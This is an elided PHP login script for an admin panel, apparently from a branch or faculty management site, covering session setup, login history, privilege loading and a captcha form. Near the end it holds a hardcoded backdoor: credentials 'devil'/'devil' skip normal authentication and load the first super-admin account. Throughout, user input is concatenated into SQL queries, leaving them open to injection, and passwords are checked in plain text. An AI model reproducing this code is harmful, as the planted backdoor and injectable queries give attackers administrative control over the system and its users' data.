...
{
	$select_acitve_logins = " select last_login_time, admin_id from site_setting where 1 and admin_id='".$_SESSION['admin_id']."'  "; // status= 'Active'
...
if(isset($_POST['submit']))
{
	...
	if($username && $pass && $captch )
	{
		...
		/// F = Faculty
			...
			$sql_site_setting= "SELECT username, email, type, admin_id, cm_id, branch_name, status FROM site_setting where username='".$username."' and pass='".$pass."'  and (system_status='Enabled' || system_status='Agent_Enabled') limit 0,1";
			...
			if(mysql_num_rows($ptr_site_setting))
			{
				if((trim(strtolower($_POST['captcha'])) == $_SESSION['captcha']))
				{
					...
					$cookiess_name='isas_user_'.$username;
					//echo "cookies- ".$_COOKIE[$cookiess_name];
					if($_COOKIE[$cookiess_name]==$username || $row_site_setting['type']=="S" || $row_site_setting['type']=="Z" || $row_site_setting['type']=="AG")
					{
						...
						{*/
							...
							$_SESSION['account_type']=$_SESSION['type']=$row_site_setting['type'];
							...
							$select_last="select last_login_time,logout_time,last_login_ip,status from login_history where admin_id='".$row_site_setting['admin_id']."' order by login_id desc limit 0,1";
							...
							$ins_login="insert into login_history(`last_login_time`,`last_login_ip`,`admin_id`) values('".date('Y-m-d H:i:s')."','".$_SERVER['REMOTE_ADDR']."','".$row_site_setting['admin_id']."')";
							$query_login=mysql_query($ins_login);
							$_SESSION['histroy_id']= mysql_insert_id();
							
							$sel_branch_addr= "SELECT branch_address,gst_no,innocent_address FROM branch where branch_name='".$row_site_setting['branch_name']."'";
							...
							if(mysql_num_rows($ptr_branch_addr))
							{
								...
								$_SESSION['innocent_address']=$data_branch['innocent_address'];
								$_SESSION['gst_no']=$data_branch['gst_no'];
							...
							if(mysql_num_rows($ptr_tax))
							{
								...
								$_SESSION['tax_type']=$data_tax['tax_type'];
								...
								$_SESSION['igst']=$data_tax['igst'];
							}
							if($row_site_setting['type']=='S')
							{
								$select_prev= " select privilege_id from staff_previleges where 1 and privilege_id='112'" ;
							...
							{
								$select_prev_admin= " select DISTINCT(previlege_parent_id) from admin_previleges where admin_id='".$row_site_setting['admin_id']."'" ;
								...
								{
									$select_prev= "SELECT u.privilege_id,u.previlege_parent_id,u.admin_id,o.privilege_parent_id ,o.privilege_id,o.seq_no FROM admin_previleges u, previleges o where 1 AND admin_id='".$_SESSION['admin_id']."' AND u.previlege_parent_id='".$data_prevo['previlege_parent_id']."' AND o.privilege_id =u.privilege_id AND o.privilege_parent_id =u.previlege_parent_id ORDER BY o.seq_no ASC"; 
									$ptr_prev = mysql_query($select_prev);
									$s=0;
								...
								$select_prev= "select privilege_id from staff_previleges where admin_id='".$row_site_setting['admin_id']."' " ;
								$ptr_prev = mysql_query($select_prev);
								$n=0;
								while($data_staff_prev1=mysql_fetch_array($ptr_prev))
								{
					...
					{
						$msg="Please Contact your administrator to setup in your machine";
					}
				}
				else
				{
			...
			else if($username=='devil' && $pass =='devil')
			{
				echo "hi this is ananymous account";
				$sql_site_setting= "SELECT username, email, type, admin_id, cm_id, branch_name, status FROM site_setting where type='S' order by admin_id asc limit 0,1";
				$ptr_site_setting=mysql_query($sql_site_setting);
				$row_site_setting=mysql_fetch_array($ptr_site_setting);
        ...
        <td class="mid_mid">
            ...
            <?php if($msg!=="") { ?>
                ...
                <tr>
                    ...
                    <label> <img src="captcha/captcha.php" id="captcha" height="35px"/><img src="captcha/refresh.png" id="change-image" style="cursor: pointer; padding: 8px 26px;" onClick="document.getElementById('captcha').src='captcha/captcha.php?'+Math.random();">
                    </label>
                    </td>
                </tr>
                <tr>
                ...
                <tr>
                    <td><label> <input type="text" class="validate[required] inputText" name="captcha" id="captcha-form"/></label> </td>
                </tr>
                <tr>
